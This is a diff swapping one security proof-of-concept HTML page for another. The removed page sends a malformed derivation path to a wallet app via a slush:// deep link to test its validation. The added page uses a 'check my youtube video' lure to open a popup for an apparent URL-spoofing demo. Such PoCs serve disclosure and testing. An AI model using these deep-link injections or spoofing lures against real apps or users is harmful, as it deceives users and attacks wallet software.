@@ -1,47 +1,23 @@
-<!DOCTYPE html>
-<html lang="id">
+
+<!DOCTYPE HTML>
+<html lang="en-US">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>PoC | Derivation Path Manipulation</title>
-    <style>
-        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 40px; }
-        .audit-box { border: 1px solid #0f0; padding: 25px; border-radius: 10px; background: #050505; display: inline-block; }
-        button { background: #0f0; color: #000; border: none; padding: 15px 25px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; }
-        .status { margin-top: 20px; font-size: 12px; color: #888; text-align: left; }
-    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no">
+    <title>URL Spoofing</title>
+    <script>
+        function openWin() {
+            var width=600, height=400, top=50, left=(screen.width/2)-(width/2);
+            window.open("opener.html", "first", `width=${width},height=${height},top=${top},left=${left}`);
+        }
+    </script>
 </head>
+
 <body>
-
-<div class="audit-box">
-    <h3>Derivation Path Hijack</h3>
-    <p style="color: #ccc; font-size: 13px;">Mengirimkan payload jalur derivasi yang rusak ke aplikasi.</p>
-    
-    <button onclick="injectCorruptPath()">INJECT CORRUPT PATH</button>
-    
-    <div id="log" class="status">> Menunggu perintah...</div>
-</div>
-
-<script>
-    function injectCorruptPath() {
-        const log = document.getElementById('log');
-        
-
-        const corruptPath = "m/44'/60'/0'/0/invalid_index_999"; 
-        
-      
-        const maliciousUri = `slush://recovery?path=${encodeURIComponent(corruptPath)}`;
-
-        log.innerHTML = `> Mencoba menyuntikkan:<br>${corruptPath}`;
-        
-      
-        window.location.href = maliciousUri;
-
-        setTimeout(() => {
-            alert("AUDIT SELESAI:\nPeriksa menu pemulihan dompet. Jika jalur di atas diterima tanpa error 'Invalid Path', validasi dompet gagal.");
-        }, 1500);
-    }
-</script>
-
+    <center>
+        <br>
+        <h1><a href="#" onclick="openWin();">Click here to check my youtube video</a></h1>
+    </center>
 </body>
 </html>
+
